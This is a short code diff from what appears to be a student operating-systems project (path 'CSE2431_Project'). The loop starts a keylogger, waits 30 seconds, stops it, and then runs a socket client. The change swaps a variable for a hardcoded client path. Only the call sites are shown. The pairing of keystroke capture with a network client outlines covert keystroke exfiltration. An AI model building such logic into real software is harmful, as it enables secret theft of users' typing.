@@ -24,7 +24,7 @@ int main (){
       keylogger_start();
       time_30s(trigger);
       keylogger_end();
-      system(dir_cli);
+      system("/CSE2431_Project/socket/client");
     }
   }
 }
